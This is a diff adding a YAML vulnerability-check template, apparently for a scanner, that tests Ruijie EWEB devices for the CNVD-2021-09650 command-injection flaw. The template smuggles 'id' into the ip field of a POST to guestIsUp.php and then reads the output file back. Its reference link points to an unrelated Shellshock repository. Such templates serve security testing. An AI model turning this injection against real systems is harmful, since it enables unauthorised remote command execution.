@@ -1,0 +1,20 @@
+name: poc-yaml-ruijie-rce-cnvd-2021-09650
+set:
+  r1: randomLowercase(9)
+rules:
+  - method: POST
+    path: /guest_auth/guestIsUp.php
+    body: mac = 1 & ip = 127.0.0.1 | id > {{r1}}.txt
+    follow_redirects: false
+    expression: |
+      response.status == 200
+  - method: GET
+    path: /guest_auth/{{r1}}.txt
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"uid")
+detail:
+  author: jdr
+  info: CNVD-2021-09650(Ruijie-EWEB网管系统 RCE)
+  links:
+    - https://github.com/opsxcq/exploit-CVE-2014-6271/
